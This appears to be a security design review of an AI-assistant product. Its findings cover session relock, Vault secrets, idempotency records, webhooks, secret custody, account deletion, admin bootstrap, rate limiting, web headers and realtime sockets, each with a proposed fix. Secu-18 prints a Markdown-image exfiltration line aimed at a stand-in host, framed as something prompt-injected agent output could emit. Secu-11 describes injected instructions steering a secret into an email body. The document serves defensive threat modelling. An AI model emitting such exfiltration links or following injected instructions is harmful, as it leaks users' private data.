## Secu-9 [major] §5 Guards/relock and §11 Vault, §12 Scheduling, §14 MCP (relock scope and restore semantics)
PROBLEM: Relock only revokes sessions' admitted status, closes subscriptions, requests run cancellation and disables share grants. It misses: Vault unlock sessions and Simon Vault grants; pending approvals (after a restore, an action proposed before relock could still be approved); queued messages and pending dispatch intents; pending reminder occurrences (delivery re-checks access only at send time, so a restore would revive them); OAuth grants, refresh tokens and API keys; pending OAuth authorization requests and connection attempts. Suspension and account deletion need the same path. Logout and session revocation also don't close that session's sockets or Vault session.
FIX: Add `core/access.restrict(userId, reason)`, used by relock, suspension and account deletion. In one D1 batch it: increments `users.access_generation`; revokes Vault sessions and Vault grants; expires pending approvals; cancels queued messages and pending dispatch intents; sets `cancel_requested_at` on active runs; marks pending reminder occurrences `suppressed_access`; disables share grants; revokes OAuth grants and refresh tokens; revokes API keys; expires pending OAuth requests and connection attempts. After commit it closes sockets and cancels Trigger runs. Restore changes only `beta_state` and revives none of these. Logout and session revocation revoke that session's Vault session and close sockets bound to that session id. Test: relock, restore, then try the old approval, Vault grant, refresh token, API key, reminder and share; every attempt must be rejected.

## Secu-10 [major] §3 Data access (in-process caches) and §5 Guards
PROBLEM: Relock, logout and revocation depend on in-process cache invalidation, justified by 'the api is a single instance'. Render runs the old and new instances side by side on every deploy: the new one takes traffic while the old one keeps existing keep-alive connections and WebSockets until SIGTERM after 60 seconds, plus a shutdown delay of up to 60 seconds. A2 auto-deploys on every merge. A relock handled by the new instance cannot invalidate the old instance's cache, open sockets or run relays. For up to about 2 minutes, a relocked or signed-out user keeps receiving protected events and can keep sending requests. In-memory throttler state also resets on every deploy.
FIX: Add: "A single instance is an operational assumption, never a security invariant. Session, access and grant cache entries have a hard 10-second TTL and carry `access_generation`. These operations always read D1 fresh: approval decisions, Vault unlock, reset and grant creation, share release, API key and OAuth grant creation, connection completion, admin actions and run dispatch. Every 30 seconds the gateway runs one batched D1 query for `access_generation` and session revocation across all connected users, and closes affected sockets with code 4401 or 4403. On SIGTERM the api stops relaying run output and closes sockets (1001) before draining HTTP."

## Secu-11 [major] §11 Vault
PROBLEM: (a) Unlocking on the server contradicts note 05 ('Unlock locally for the current session'; 'Regular vault decryption can remain in the browser') and is not recorded as a decision. The design also gives no handling rules for a passphrase that reaches the server. (b) The Vault session cookie has no `__Host-` prefix or SameSite setting and is not bound to the user or auth session, so any `*.tejassuds.com` host can toss a cookie and a Vault session outlives logout. (c) There is no limit on unlock attempts, although the brief requires a throttled state; a stolen session allows online guessing. (d) The executor substitutes secrets into connector arguments without any redaction of results or errors that echo credentials before they reach the model, stream, D1 or logs. It also doesn't restrict which argument a handle may fill, so injected instructions could put the handle in an email body. (e) Reset revokes sessions but not Simon grants. Editing or deleting an item doesn't revoke its grants, and there is no maximum grant lifetime. (f) VAULT_RECOVERY_KEY has no versioning for rotation.
FIX: Record a decision: Vault unlock runs on the server; the passphrase is never logged, never stored in error reports or idempotency records, and exists only in request memory. Replace the Vault session text with: "The cookie is `__Host-sym_vault` (Secure, HttpOnly, SameSite=Strict, Path=/), expiring after 5 minutes idle or 60 minutes absolute. `vault_sessions` stores user id and auth session id, and a request whose session doesn't match either is rejected. Logout, session revocation, relock, suspension and reset revoke it. Unlock allows 5 failures per user per 15 minutes, then a 15-minute lockout, and 20 per 24 hours, counted in D1. Grants are created only in the owner's trusted UI and name one item, one task, one tool slug and one argument path. The executor substitutes the value only at that path and rejects handles anywhere else. A grant lasts at most 24 hours and is revoked on item edit or delete, reset, relock and account deletion. Before any tool result or error leaves the executor, every resolved value (including its base64 and URL-encoded forms) is replaced with `[vault:<label>]`. Keys are `VAULT_RECOVERY_KEY_<n>` with `_CURRENT`, and each recovery wrapper stores its key version."

## Secu-12 [major] §6 HTTP API (idempotency records)
PROBLEM: `idempotency_records` stores a 'response' and an 'input fingerprint', with no encryption rule for either. Responses from mutations that mint secrets contain one-time secrets the specs forbid storing: raw share URLs, `sym_` API keys and invite codes. Other responses contain user content such as messages, Vault item values and document text. All of it would sit in plaintext D1, outside the `_enc` rule in §4. A plain hash used as the input fingerprint lets anyone with a D1 dump dictionary-attack low-entropy secrets (Vault values, share passwords, short messages). The approval 'argument hash' has the same weakness.
FIX: Add: "Idempotency records store `response_enc` (a field envelope with purpose `idempotency_response`) and `fingerprint = HMAC(IDEMPOTENCY_SECRET, 'idem' || 0x00 || canonical JSON)`. Approval argument digests use HMAC with purpose `approval-args`. Endpoints that mint secrets (invite generation, API key creation, share release, OAuth code issuance) never put the secret in the record. An exact retry returns only the non-secret fields with `secretUnavailable: true`, and the UI offers the explicit replacement flow. Vault and share-password bodies are fingerprinted with HMAC only. Test: after each minting call, scan every D1 table for the raw secret."

## Secu-13 [major] §8 durable output fallback, §3 and §12 internal events, and webhooks
PROBLEM: The `INTERNAL_EVENT_SECRET` push is described only as 'signed'. There is no timestamp window, replay protection or body binding, and no rule that payload fields are untrusted hints. The endpoint is public on Render and may carry run output (the fallback path) and user-topic announcements. If the api trusts user or conversation ids in the payload, a replayed or forged event could inject content into another user's conversation topic or show a fake approval request. Verification for Resend and Composio webhooks (raw body, timestamp tolerance, deduplication) is also missing, and the Composio connection-expired subscription isn't mentioned.
FIX: Add: "`POST /v1/internal/events` is served on the api host only, with no CORS, CSRF or cookies. It requires `X-Sym-Timestamp`, `X-Sym-Event-Id` and `X-Sym-Signature: v1=HMAC-SHA256(INTERNAL_EVENT_SECRET_<n>, 'v1'|0x00|timestamp|0x00|eventId|0x00|method|0x00|path|0x00|sha256(rawBody))`, compared with timingSafeEqual inside a ±300-second window; event ids are remembered for 10 minutes and repeats are rejected. Payloads carry only ids and sequence numbers. The api re-reads owner, conversation, run status and executor generation from D1 and re-authorizes before publishing to any topic. Pushed run output is encrypted envelopes bound to run id and seq. Resend (`resend.webhooks.verify`) and Composio (`triggers.parse` with `verifySecret`) webhooks use `rawBody`, reject stale timestamps and deduplicate on `svix-id` or `webhook-id`."

## Secu-14 [major] §4 Encryption model (key custody, versioning, key-wrap AAD) and §16 Configuration
PROBLEM: There is no allowlist of secrets per runtime. The worker needs CONTENT_KEK, D1, R2, Composio and AI keys, but nothing prevents syncing every secret to Trigger. VAULT_RECOVERY_KEY, the session, OTP, invite, share and MCP digest secrets, and MCP_OAUTH_SIGNING_KEY would then sit in a second hosted environment, where a leak would allow Vault recovery, token forgery and offline reversal of digests. There is no rule that secrets must differ from one another. Only CONTENT_KEK is versioned; the recovery key, digest secrets, the MCP signing key (`kid`) and the internal event secret are not. AAD is defined only for field and object envelopes, not for the account-key wrap, Vault passphrase and recovery wraps, the Vault session re-wrap, Vault items or grants. Without it, wrapped keys and Vault ciphertext can be swapped between users or versions without failing.
FIX: Add a secret inventory to `packages/config`. The worker receives only `CONTENT_KEK_*`, `INTERNAL_EVENT_SECRET_*`, a worker-only D1 token, the R2 token, `COMPOSIO_API_KEY`, AI provider keys, `RESEND_API_KEY` and the PostHog project key. The worker schema rejects at startup any of: `VAULT_RECOVERY_KEY_*`, `*_DIGEST_SECRET`, `MCP_OAUTH_SIGNING_KEY_*`, `IDEMPOTENCY_SECRET`, or webhook secrets. `syncEnvVars` reads that allowlist. Config rejects any two secrets with equal values. Every secret family is `<NAME>_<n>` plus `<NAME>_CURRENT`, and each stored digest, wrap and JWT `kid` records its version. Freeze AAD in the test vectors for: the account key wrap `{f:'symk1',p:'account-key',o,kv}`; the Vault passphrase wrap `{p:'vault-pass',o,vv}`; the recovery wrap `{p:'vault-recovery',o,rk}`; the Vault session wrap `{p:'vault-session',o,s}`; Vault items `{p:'vault-item',o,i}`; grants `{p:'vault-grant',o,g,t}`.

## Secu-15 [major] Missing: account deletion (§5 and §4 related)
PROBLEM: Account deletion is in scope: the settings and beta-gate briefs require it, and P4 calls it 'the only deletion path'. The architecture has no design for it. Nothing covers the order of revocations or crypto-shredding the per-account data key. Nothing revokes Composio connections upstream (SDK `delete` does not). Nothing removes R2 bundles, artifacts and search indexes, deletes the PostHog person, cancels Trigger runs, handles tombstones or states the backup residual window. Without this, 'deleted' accounts keep decryptable content and live upstream OAuth tokens.
FIX: Add '§5a Account deletion': "`POST /v1/account/deletion` needs identity access, CSRF, and an `account_delete` OTP verified within the last 10 minutes. One D1 batch runs `core/access.restrict`, marks the user `deleting`, revokes all sessions, API keys, OAuth grants and share grants, and deletes the `account_keys` row. Deleting that row is the crypto-shred: every `_enc` field, R2 object, index, Vault wrapper and grant becomes undecryptable at once. An idempotent `account-purge` job (Trigger when durable, api otherwise) then: deletes D1 rows and R2 objects by owner; deletes Composio connected accounts with `revoke_on_delete: true`, plus the user's Composio sessions; cancels Trigger runs; requests PostHog person and event deletion by analytics id; keeps only a digest-keyed tombstone and redacted audit record. Document the D1 and R2 backup retention window as the maximum residual exposure."

## Secu-16 [major] §5 Identity, sessions, access (admin bootstrap)
PROBLEM: Bootstrap runs on every startup and every successful verification, and grants admin plus an access grant whenever the configured account 'has no admin role'. If another admin demotes, relocks or suspends that account (for example because it was compromised), the next deploy or login silently promotes it again and re-issues access. That bypasses relock and suspension, and gives whoever controls that mailbox a standing admin backdoor for as long as the env var is set.
FIX: Replace the bullet with: "Admin bootstrap runs once. It applies only when no user has role admin and no `admin_bootstrap` event exists, and the normalized `ADMIN_BOOTSTRAP_EMAIL` matches a verified, non-suspended, non-relocked account. It is a single conditional batch: `UPDATE users SET role='admin' WHERE id=? AND suspended_at IS NULL AND beta_state<>'relocked' AND NOT EXISTS (SELECT 1 FROM users WHERE role='admin') AND NOT EXISTS (SELECT 1 FROM beta_admin_events WHERE action='admin_bootstrap') RETURNING id`, followed by an idempotent grant and the audit event. It never clears suspension or relock. Once bootstrap is consumed, startup warns if the variable is still set. Bootstrapping again requires the CLI with `--force-rebootstrap`, which records actor and reason."

## Secu-17 [major] §3 D1 request budget, §13 share routes, §14 OAuth/MCP (abuse and availability)
PROBLEM: (a) IP throttling uses in-memory @nestjs/throttler, which resets on every deploy. It is keyed on `req.ip`, whose correctness on Render is unverified: too few trusted hops puts every user behind one proxy IP (global lockout), and too many lets attackers spoof X-Forwarded-For. (b) Unauthenticated endpoints that hit D1 can drain the process token bucket and starve real users: lookup, signup, share GETs with random keys, public artifact reads (a D1 re-check on every request, CDN caching disabled), `/mcp` with random bearer tokens, `/oauth/register`, and client-metadata-document fetches. If the bucket is shared or misconfigured, they can also trip the Cloudflare limit that blocks all API calls for 5 minutes, so one popular public artifact could take the product offline. (c) Argon2id at 19 MiB, with no concurrency cap, is a memory-exhaustion vector on a single instance.
FIX: Add: "(1) At first deploy, measure Render's X-Forwarded-For behavior and set `TRUST_PROXY_HOPS`; a test proves that a client-supplied XFF cannot change the tracked IP. (2) In-memory per-IP buckets run before any D1 call on unauthenticated routes: lookup and signup 10 per 10 minutes, share reads 60 per minute, password POST 10 per minute, `/oauth/register` 5 per hour, `/oauth/authorize` 30 per 10 minutes, invalid `/mcp` credentials 20 per minute. (3) Negative caches (60 s) for unknown share-token, API-key and JWT digests; positive grant cache ≤10 s, invalidated on revoke or relock. (4) The D1 client has two lanes: unauthenticated work may use at most 30% of the bucket and is shed first with 503. (5) Every secret-protecting counter (OTP, Vault unlock, share password) is durable in D1. (6) All Argon2id work shares one semaphore (2 concurrent, queue of 16, then `rate.limited`)."

## Secu-18 [major] §9 Documents, §10 Search/keyboard/appearance and the web app (rendering untrusted Markdown; web security headers)
PROBLEM: The web app renders model output, tool activity, approval previews and task documents, and prompt-injected Simon runs or third-party MCP agents can write all of these. Sanitization is specified only for the share host. A Markdown image in chat or the editor (`![](https://evil.test/?d=<data>)`) is a zero-click exfiltration and tracking channel, and `javascript:` or deceptive links are unhandled. The Vercel app has no CSP, frame-ancestors or HSTS rule, so OAuth consent, approval cards, Vault reveal and share release can be clickjacked. Any XSS on the web origin can read the CSRF token and act as the user.
FIX: Add a web security rule: "Chat messages, tool activity, approval previews and document previews render Markdown through the shared sanitizer with raw HTML disabled. Images from non-Symplist origins render as a labeled link and are not fetched. Links allow only https and mailto, show the destination host, and use rel=noopener noreferrer. The editor shows a click-to-load placeholder for remote images. `next.config` headers send: `Content-Security-Policy: default-src 'self'; script-src 'self' <Next nonce/hashes>; connect-src 'self' <API_ORIGIN> wss://<api host> <POSTHOG_HOST>; img-src 'self' data: blob:; font-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self' <API_ORIGIN>; frame-ancestors 'none'`, plus `X-Frame-Options: DENY`, `Strict-Transport-Security: max-age=63072000; includeSubDomains`, `X-Content-Type-Options: nosniff`, and `Referrer-Policy: no-referrer` on OAuth consent. The api and share host also send `frame-ancestors 'none'`."

## Secu-19 [minor] §7 Realtime protocol
PROBLEM: A socket is authenticated once, at upgrade. The spec doesn't bind a socket to its session id and doesn't require an ownership check when subscribing to `conversation:<id>`; 'checks access' could be read as a beta-access check only, which would expose another user's decrypted snapshot. Logout, session expiry and revocation don't close existing sockets. There is no `maxPayload` or per-socket frame or subscription limit.
FIX: Add: "Each socket records user id and session id. `sub` to `conversation:<id>` loads the conversation and requires owner = socket user and admitted access; unknown and foreign ids both return `{\"t\":\"err\",\"code\":\"not_found\"}`. For users who aren't admitted, the `user` topic carries access-state events only. Logout, revocation and expiry close that session's sockets. `maxPayload` is 16 KiB; more than 20 client frames per 10 seconds or more than 50 subscriptions closes the socket with 1008."
